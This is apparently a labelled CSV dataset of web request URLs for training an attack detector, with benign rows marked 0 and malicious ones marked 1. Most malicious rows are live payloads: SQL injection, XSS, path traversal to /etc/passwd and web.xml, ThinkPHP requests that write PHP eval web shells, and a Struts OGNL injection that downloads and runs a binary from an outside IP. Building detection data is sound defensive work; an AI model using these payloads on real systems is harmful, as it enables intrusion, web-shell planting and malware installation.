request_url,status
/login/id=en45jtr&op=translate&sl=zh-CN&tl=en,0
topic/5841967302,0
/thisisademo/op=buildahuge126964,0
search?q=tensorflow+hehe&oq=tensorflow+ming+ming+shi+ti+shi+bie&aqs=chrome.1.69i57j0j69i64.15835j0j7&sourceid=chrome&ie=UTF-8,0
questions/45955241/how-do-i-create-padded-batches-in-tensorflow-for-tf-train-sequenceexample-data-u,0
/zh_CN/latest/c14/p09_raise_exception_in_response_to_another_exception.html?token=SELECT+COUNT(1)+FROM+USER,1
/wwsso/login?service=<script>alert('5rghu')<script/>,1
/news/features/distributed-deep-learning?data=update+id+192+union+all&session=dsnuifdehruebuebffnwuifsidsf4758345,1
/iPhone/news/2019-01-16/The-iPhone-XS-smart-battery-shell-page-mentioned-AirPower_700403.shtml?part=<<<<xss(5345)>>>>>,1
/index.php？id=select-,1
/home/name='SELECT*FROMLOGINTABLEUNIONALL',1
/thisisademo/op=buildahuge126964,0
/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.141.104/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.141.104/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%20%26%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action,1
/jcms_public/jcms_files/jcms1/web3/site/module/changepage/gettitle.jsp?appid=1&showtip=%2F..%5C..%5CWEB-INF%5Cweb.xml%3F&titlelimit=18&webid=3&cataid=109&catatype=2&position=prev&infoid=4403,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=3,1
/common.login.login.dhtml?username=&loginsave=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd&password=,1
/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('saohai.php''w')base64_decode('U2FvSGFpPD9waHAgQGV2YWwoJF9QT1NUWydoaSddKTs/Pg=='));?%3E,1
/index.php?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php''w')'SaoHai%3C?php%20@eval($_POST['hi']);?%3E');,1
/voteApp/SuggestionShow.aspx?SuggestionID=76%20OR%20@%60'%60%20AND%20(SELECT%20*%20FROM%20(SELECT%20COUNT(*)CONCAT(FLOOR(rand(0)*2)(SELECT%20USER()))a%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20a)b)%20OR%20@%60'%60,1
/voteApp/SuggestionShow.aspx?SuggestionID=76%20OR%201122=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL),1
/voteApp/SuggestionShow.aspx?SuggestionID=76'%20AND%201471=UTL_INADDR.GET_HOST_ADDRESS(CHR(101)%7C%7CCHR(99)%7C%7CCHR(114)%7C%7CCHR(121)%7C%7CCHR(58)%7C%7CCHR(102)%7C%7C(SELECT%20(CASE%20WHEN%20(630=630)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(105)%7C%7CCHR(110)%7C%7CCHR(100)%7C%7CCHR(58)%7C%7CCHR(120)%7C%7CCHR(108))%20AND%20'OGmp'='OGmp,1
/voteApp/SuggestionShow.aspx?SuggestionID=(SELECT%20UPPER(XMLType(CHR(60)%7C%7CCHR(104)%7C%7CCHR(107)%7C%7CCHR(58)%7C%7C(SELECT%20(CASE%20WHEN%20(1122=1122)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)%7C%7CCHR(58)%7C%7CCHR(49)%7C%7CCHR(57)%7C%7CCHR(57)%7C%7CCHR(55)))%20FROM%20DUAL),1
/voteApp/SuggestionShow.aspx?SuggestionID=76'%2b(SELECT%20CONVERT(INTCHAR(106)%2bCHAR(106)%2bCHAR(106))%20FROM%20SYSCOLUMNS)%2b',1
/index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lx.php&content=CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E,1
http://xzsp.cangzhou.gov.cn/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=4,1
/opac/search_rss.php?location=ALL%27%20UNION%20ALL%20SELECT%20CHR(113)%7C%7CCHR(118)%7C%7CCHR(112)%7C%7CCHR(122)%7C%7CCHR(113)%7C%7CCHR(100)%7C%7CCHR(108)%7C%7CCHR(98)%7C%7CCHR(104)%7C%7CCHR(120)%7C%7CCHR(71)%7C%7CCHR(112)%7C%7CCHR(105)%7C%7CCHR(108)%7C%7CCHR(81)%7C%7CCHR(113)%7C%7CCHR(122)%7C%7CCHR(120)%7C%7CCHR(113)%7C%7CCHR(113)NULL%20FROM%20DUAL--%20&title=ccc&doctype=ALL&lang_code=ALL&match_flag=forward&displaypg=20&showmode=list&orderby=DESC&sort=CATA_DATE&onlylendable=yes&with_ebook=&with_ebook=,1
/index.php?a=init&c=index&m=search&selmenu=8&seltext=(SELECT%201%20FROM(SELECT%20COUNT(*)CONCAT((SELECT%20(SELECT%20CONCAT(0x5e5e5e unhex(Hex(cast(database()%20as%20char))) 0x5e5e5e))%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%200 1) floor(rand(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a),1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1',1
/index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php''w')'SaoHai%3C?php%20@eval($_POST['hi']);?%3E');,1
/index.php?m=search&c=index&a=init&selmenu=WEB-INF/web.xml%00&seltext=栏目搜索&=搜索,1
/index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=saohai.php&content=SaoHai%3C?php%20eval($_POST['hi']);?%3E,1
/index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars[0]=phpinfo().fputs(fopen('saohai.php''w')'SaoHai%3C?php%20@eval($_POST['hi']);?%3E');,1
/gentleCMS/gipapplyfront/sumitpage.do?applyertype=1&gettype=50&cardid=1&ext1=sq&zipcode=100044&indexcode=100044&providertype=40&fax=317-317-3137&applydesc=&telephone=13412345678&cardtype=10&applyername=aSdFh1&organizecode=100044&validatecode=01%252F01%252F1967&contactname=aSdFh1&legalperson=1&department=1&email=sample%2540email.tst&address=WEB-INF%5Cweb.xml%3F&purpose=,1
/trsapp/appWeb.do?method=saveAppData&NAME=WEB-INF%2Fweb.xml%3F&checkCode=&themeId=0&TITLE=&TELEPHONE=&EMAIL=&CONTENT=&sub_dep=4&POSTCODE=&appId=1585&isNeedTheme=&groupId=2,1
_/index.php?f_achtype=WEB-INF/web.xml&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20001&f_messunit%5b%5d=50013&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
/index.php?f_achtype=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20003&f_messunit%5b%5d=50013&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
/index.php?f_achtype=(select(0)from(select(sleep(18)))v)/*'%2b(select(0)from(select(sleep(18)))v)%2b'%22%2b(select(0)from(select(sleep(18)))v)%2b%22*/&f_address=3137%20Laguna%20Street&f_appname=qpexvyio&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20001&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
/index.php?f_achtype=10002&f_address=3137%20Laguna%20Street&f_appname=/etc/passwd&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20002&f_messunit%5b%5d=50013&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?f_achtype=10003&f_address=3137%20Laguna%20Street&f_appname=file:///etc/passwd&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20001&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?f_achtype=(select(0)from(select(sleep(18)))v)/*'%2b(select(0)from(select(sleep(18)))v)%2b'%22%2b(select(0)from(select(sleep(18)))v)%2b%22*/&f_address=3137%20Laguna%20Street&f_appname=qpexvyio&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20001&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?f_achtype=/etc/passwd&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20002&f_messunit%5b%5d=50013&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?q=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd,1
_/index.php?f_achtype=10002&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=WEB-INF%5cweb.xml&f_fax=317-317-3137&f_message=20&f_messtype=20003&f_messunit%5b%5d=50001&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?f_achtype=10002&f_address=3137%20Laguna%20Street&f_appname=qpexvyio&f_cercode=94102&f_email=sample%40email.tst&f_fax=317-317-3137&f_message=20&f_messtype=20001&f_messunit%5b%5d=50013&f_messuse=1&f_tel=555-666-0606&f_workunit=(select(0)from(select(sleep(4)))v)/*'%2b(select(0)from(select(sleep(4)))v)%2b'%22%2b(select(0)from(select(sleep(4)))v)%2b%22*/&f_zip=94102,1
_/index.php?f_achtype=10002&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=/etc/passwd&f_fax=317-317-3137&f_message=20&f_messtype=20002&f_messunit%5b%5d=50001&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?f_achtype=10003&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd&f_fax=317-317-3137&f_message=20&f_messtype=20002&f_messunit%5b%5d=50001&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
_/index.php?f_achtype=10001&f_address=3137%20Laguna%20Street&f_appname=cpouvbrd&f_cercode=94102&f_email=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd&f_fax=317-317-3137&f_message=20&f_messtype=20003&f_messuse=1&f_tel=555-666-0606&f_workunit=1&f_zip=94102,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=1,1
f_areacode=../../WEB-INF/web.xml&f_tag=1,1
f_areacode=file://etc/passwd&f_tag=1,1
f_areacode=../../WEB-INF/web.xml%3f&f_tag=1,1
f_areacode=./WEB-INF/web.xml%3f&f_tag=1,1
f_areacode=../../../WEB-INF/web.xml%3f&f_tag=2,1
f_areacode=0531&f_tag=../../../WEB-INF/web.xml,1
f_areacode=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd&f_tag=2,1
